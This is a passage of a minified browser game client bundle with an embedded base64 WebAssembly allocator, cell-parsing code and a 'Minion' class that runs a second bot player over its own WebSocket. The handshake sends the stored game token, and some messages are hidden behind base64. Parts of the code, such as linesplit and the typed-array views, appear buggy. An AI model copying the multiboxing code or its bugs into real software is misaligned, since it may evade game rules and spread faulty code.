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"
          ),
          s = {
            env: {
              addOrUpdate(t, s, i, n, o, r, l, c, h) {
                let { playback: d } = a;
                if (d.dry) {
                  let { updates: u } = d,
                    p = u[0][0];
                  p[n] = {
                    type: s,
                    pid: i,
                    id: n,
                    x: o,
                    y: r,
                    size: l,
                    flags: c,
                  };
                  return;
                }
                if (
                  ((o = 32 & s ? void 0 : o),
                  (l = 64 & s ? void 0 : l),
                  2 === t)
                ) {
                  let { minion: m } = a,
                    { cells: A } = m,
                    f;
                  A.has(n)
                    ? (f = A.get(n))
                    : ((f = {
                        type: 15 & s,
                        pid: i,
                        id: n,
                        x: o,
                        y: r,
                        size: l,
                      }),
                      A.set(n, f)),
                    void 0 !== o && ((f.x = o), (f.y = r)),
                    void 0 !== l && (f.size = l),
                    f.pid &&
                      f.pid == m.playerId &&
                      ((m.aliveResult = !0), m.ownedCells.add(f));
                  return;
                }
                g(15 & s, i, n, o, r, l, c, h);
              },
              destroy(t, s) {
                let { playback: i } = a;
                if (i.dry) {
                  i.destroyCell(s);
                  return;
                }
                if (2 === t) {
                  let { cells: n } = a.minion;
                  n.delete(s);
                  return;
                }
                A(s);
              },
              eat(t, s, i) {
                let { playback: n } = a;
                if (n.dry) {
                  n.eatCell(s, i);
                  return;
                }
                if (2 === t) {
                  let { cells: o } = a.minion;
                  o.delete(s);
                  return;
                }
                m(s, i);
              },
              emscripten_notify_memory_growth(t) {},
            },
          },
          i = (this.instance = await WebAssembly.instantiate(
            await WebAssembly.compile(await t.arrayBuffer()),
            s
          )),
          { memory: n } = i.exports;
        return (
          (this.HEAPU8 = new Uint8Array(n.buffer)),
          (this.HEAPU16 = new Uint8Array(n.buffer)),
          (this.HEAPF32 = new Uint8Array(n.buffer)),
          (this.HEAPU32 = new Uint8Array(n.buffer)),
          delete this.initializing,
          !0
        );
      }
      deserialize(t, s, i) {
        if (!this.instance) return 0;
        let { deserialize: a, malloc: n, free: o } = this.instance.exports,
          r = s.byteLength,
          l = n(r);
        this.HEAPU8.set(s, l), a(l, i, t), o(l);
      }
    }
    let C = new f();
    C.init(),
      (window.Module = C),
      (a.parseCells = (t) =>
        C.deserialize(1, new Uint8Array(t.buffer, 1), t.id)),
      (t.exports = {
        wasmModule: C,
        addOrUpdateCell: g,
        destroyCell: A,
        eatCell: m,
      });
  }),
  (imports.oldParseCells = function (t, s, i) {
    let a = i(135),
      n = i(136),
      o = i(137),
      r = i(138),
      l = i(139),
      c = i(140),
      h = i(1);
    t.exports = (t) => {
      h.timestamp = performance.now();
      let s = h.cells,
        i = h.ownedCells,
        d = !h.spectating && !h.replaying,
        u = !1;
      i.clear();
      for (let p; (p = t.readUInt8()); p) {
        let g = 1 === p && t.readUInt16BE(),
          m = t.readUInt32BE(),
          A = t.readInt32BE(),
          f = t.readInt32BE(),
          C = t.readInt16BE(),
          v;
        if (s.has(m))
          (v = s.get(m)).update(),
            (v.ox = v.x),
            (v.oy = v.y),
            (v.oSize = v.size);
        else {
          let w = { id: m, x: A, y: f, size: C, flags: -1 };
          switch (p) {
            case 1: {
              let I = h.playerManager.getPlayer(g);
              (w.texture = I.texture), (v = new a(w, I));
              break;
            }
            case 2:
              v = new o(w);
              break;
            case 3:
              v = new r(w);
              break;
            case 4:
              v = new n(w);
              break;
            case 5:
            default:
              v = new l(w);
              break;
            case 6:
              v = new c(w);
          }
          v.isFood ? h.scene.addFood(v.sprite) : h.scene.addCell(v.sprite),
            (v.initialUpdate = t.id),
            s.set(m, v);
        }
        (v.nx = A),
          (v.ny = f),
          (v.nSize = C),
          (v.updateStamp = h.timestamp),
          v.player &&
            (v.player.isMe && (i.add(v), (u = !0)),
            d ? (v.player.lastUpdate = t.id) : delete v.player.lastUpdate);
      }
      d
        ? h.replay.addHistory(t)
        : h.replay.updateHistory.length && h.replay.clearHistory(),
        (h.state.isAlive = u),
        u && (delete h.spectating, delete h.viewSwitched);
      for (let $; ($ = t.readUInt32BE()); ) {
        if (!s.has($)) continue;
        let k = s.get($);
        k.destroy();
      }
      for (let b; (b = t.readUInt32BE()); ) {
        let S = t.readUInt32BE();
        if (!s.has(b)) continue;
        let _ = s.get(b);
        _.eaten(S);
      }
    };
  }),
  (imports.Minion = function (t, s, i) {
    let a = i(4),
      n = i(5),
      { clampNumber: o } = i(8),
      r = i(144),
      l = i(142);
    class c {
      constructor(t) {
        (this.game = t),
          (this.running = !1),
          this.opened,
          this.alive,
          this.ws,
          (this.cells = new Map()),
          (this.ownedCells = new Set()),
          (this.pauseMovementUntil = 0),
          (this.splitCount = 0),
          this.playerId,
          this.pingInterval;
      }
      open(t) {
        this.running && this.close(),
          (this.ws = new WebSocket((this.lastUrl = t), "tFoL46WDlZuRja7W6qCl")),
          (this.ws.binaryType = "arraybuffer"),
          (this.ws.onopen = () => {
            this.opened && (this.ws.onclose = this.onClosed.bind(this));
          }),
          (this.ws.onclose = this.onRejected.bind(this)),
          (this.ws.onmessage = this.handleMessage.bind(this)),
          (this.opened = !0);
      }
      close() {
        (this.running = !1),
          delete this.opened,
          delete this.alive,
          this.ws &&
            ((this.ws.onmessage = null),
            (this.ws.onclose = null),
            (this.ws.onerror = null),
            this.ws.close(),
            (this.ws = null)),
          this.cells.clear(),
          this.ownedCells.clear(),
          delete this.playerId,
          (this.pauseMovementUntil = 0),
          (this.splitCount = 0),
          delete this.ticksSinceDeath,
          this.pingInterval &&
            (clearInterval(this.pingInterval), delete this.pingInterval);
      }
      destroy() {
        (this.destroyed = !0),
          this.running && this.close(),
          delete this.game,
          delete this.cells,
          delete this.ownedCells;
      }
      get active() {
        return this.ws && this.ws.readyState === WebSocket.OPEN;
      }
      send(t) {
        this.active &&
          (t instanceof SmartBuffer && (t = t.view), this.ws.send(t));
      }
      onRejected() {
        let t = atob("RHVhbCBmYWlsZWQgdG8gY29ubmVjdA==");
        n.toast.fire({ type: "error", title: t, timer: 2e3 });
      }
      onClosed(t) {
        if (1003 == t.code || this.destroyed) return;
        let s = atob("RHVhbCBkaXNjb25uZWN0ZWQ=");
        t.reason && (s += ` (${t.reason})`),
          n.toast.fire({ type: "info", title: s, timer: 1500 }),
          setTimeout(() => {
            (s = atob("RHVhbCBpcyByZWNvbm5lY3Rpbmc=")),
              n.toast.fire({ type: "info", title: s, timer: 1500 }),
              (this.running = !1),
              setTimeout(() => {
                this.destroyed ||
                  this.game?.state.connectionUrl !== this.lastUrl ||
                  this.open(this.lastUrl);
              }, 1e3);
          }, 2e3);
      }
      handleMessage(t) {
        let s = new SmartBuffer(t.data);
        switch (s.readUInt8()) {
          case 1:
            this.init(s);
            return;
          case 2: {
            let i = new Uint8Array(s.buffer, 1);
            this.handshake(new r(i).build());
            return;
          }
          case 6: {
            let n = SmartBuffer.fromSize(1);
            n.writeUInt8(6), this.send(n);
            return;
          }
          case 10: {
            let o = (this.alive = this.parseCells(s));
            !o &&
              this.autoRespawning &&
              37 == ++this.ticksSinceDeath &&
              this.triggerAutoRespawn();
            return;
          }
          case 20:
            a.minionAutoRespawn &&
              ((this.autoRespawning = !0), (this.ticksSinceDeath = 0));
            break;
          case 22:
            this.game.events.$emit("show-image-captcha", this);
            return;
          default:
            return;
        }
      }
      init(t) {
        if (!this.active) return;
        (this.running = !0),
          (this.pingInterval = setInterval(this.ping.bind(this), 1e3)),
          n.toast.fire({
            type: "info",
            title: "Your minion has connected",
            timer: 1500,
          });
        let s = t.readUInt8();
        s >= 4
          ? (t.readUInt8(),
            t.readUInt16LE(),
            (this.playerId = t.readUInt16LE()),
            t.readInt16LE(),
            t.readInt16LE(),
            t.readInt16LE(),
            t.readInt16LE(),
            t.readUInt8())
          : s >= 2
          ? (t.readUInt8(),
            t.readUInt16LE(),
            (this.playerId = t.readUInt16LE()))
          : (t.readUInt16LE(), (this.playerId = t.readUInt16LE()));
      }
      handshake(t) {
        let s = SmartBuffer.fromSize(2 + t.length);
        s.writeUInt8(5),
          s.writeUInt8(supportedProtocol),
          s.ensureCapacity(t.length),
          t.forEach(s.writeUInt8.bind(s)),
          l(s, !0);
        let i = localStorage.vanisToken;
        a.minionUseToken && i && s.writeStringNT(i), this.send(s);
      }
      ping() {
        if (!this.running) return;
        let t = SmartBuffer.fromSize(1);
        t.writeUInt8(3), this.send(t);
      }
      spawn() {
        let t = SmartBuffer.fromSize(1);
        t.writeUInt8(1), l(t, !0), this.send(t);
      }
      feed(t) {
        let s = 1 == arguments.length,
          i = SmartBuffer.fromSize(s ? 2 : 1);
        i.writeUInt8(21), s && i.writeUInt8(+t), this.send(i);
      }
      split(t) {
        this.centralizeCells || this.move();
        let s = SmartBuffer.fromSize(2);
        s.writeUInt8(17),
          s.writeUInt8(t),
          this.send(s),
          (this.splitCount += t),
          console.log(this.splitCount, t),
          this.splitCount <= 2
            ? (this.pauseMovementUntil = performance.now() + 300)
            : ((this.pauseMovementUntil = 0), (this.splitCount = 0));
      }
      move() {
        if (!this.running || this.ignoreMovement) return;
        let t;
        this.centralizeCells
          ? (t = SmartBuffer.fromSize(1)).writeUInt8(9)
          : ((t = SmartBuffer.fromSize(5)).writeUInt8(16),
            t.writeInt16LE(this.x),
            t.writeInt16LE(this.y)),
          this.send(t);
      }
      chat(t) {
        let s = SmartBuffer.fromSize(t.length + 1);
        s.writeUInt8(99), s.writeEscapedString(t), this.send(s);
      }
      parseCells(t) {
        this.ownedCells.clear(),
          (this.aliveResult = !1),
          Module.deserialize(2, new Uint8Array(t.buffer, 1), 1);
        let s = (this.alive = this.aliveResult);
        return delete this.aliveResult, s;
      }
      toggleAutoRespawn() {
        let t = !a.minionAutoRespawn;
        a.set("minionAutoRespawn", t),
          this.autoRespawning && this.triggerAutoRespawn(),
          n.toast.fire({
            type: "info",
            title: `Minion auto respawn ${t ? "enabled" : "disabled"}`,
            timer: 1500,
          });
      }
      triggerAutoRespawn() {
        (this.autoRespawning = !1), this.spawn();
      }
      triggerAction(t, s) {
        if (this.running)
          switch (t) {
            case "autoRespawn":
              this.toggleAutoRespawn();
              return;
            case "feed":
              this.feed(s);
              return;
            case "split":
              this.split(s);
              return;
            case "stopMovement":
              void 0 == s && (s = !this.centralizeCells),
                (this.centralizeCells = s) && this.lockLinesplit(!1);
              return;
            case "lockLinesplit":
              this.lockLinesplit();
              return;
            case "linesplit":
              this.linesplit();
              return;
            case "respawn":
              this.spawn();
              return;
            case "move":
              this.move();
              return;
            default:
              setStatus(`Invalid action '${t}' provided`);
              return;
          }
      }
      get mass() {
        let t = 0;
        return (
          this.ownedCells.forEach((s) => {
            t += Math.round(Math.pow(s.size / 10, 2));
          }),
          t
        );
      }
      get viewable() {
        return this.alive || this.autoRespawning;
      }
      lockLinesplit(t) {
        if ((void 0 === t && (t = !this.ignoreMovement), t)) {
          this.move();
          let s = SmartBuffer.fromSize(1);
          s.writeUInt8(15), this.send(s), (this.centralizeCells = !1);
        }
        this.ignoreMovement = t;
      }
      linesplit() {
        let { mouse: t } = this.game,
          s = 0,
          i,
          a;
        for (let n of this.ownedCells) {
          let o = t.x - n.x,
            r = t.y - n.y,
            l = Math.round(Math.pow(n.size / 10, 2)) / Math.hypot(o, r);
          l > s && ((s = l), (i = x), (a = y));
        }
        if (0 != s) {
          let c = Math.atan2(a, i);
          (t.x = t.x + 1e4 * Math.cos(c)),
            (t.y = t.y + 1e4 * Math.sin(c)),
            this.split(3),
            (this.pauseMovementUntil = performance.now() + 1500);
        }
      }
      updatePosition() {
        let { game: t } = this,
          { camera: s } = t,
          { x: i, y: a } = t.rawMouse;
        (this.x = o(
          s.position.x + (i - window.innerWidth / 2) / s.scale.x,
          -32768,
          32767
        )),
          (this.y = o(
            s.position.y + (a - window.innerHeight / 2) / s.scale.y,
            -32768,
            32767
          ));
      }
      tick() {
        if (!this.running || this.destroyed) return;
        let t = this.ownedCells.size;
        this.cellCount !== t &&
          ((this.cellCount = t),
          this.game.events.$emit("minion-cells-changed", t));
      }
    }
    t.exports = c;
  }),
  (imports.initialData = function (t) {
    t.exports = function t(s) {
      let i = { border: {}, food: {} };
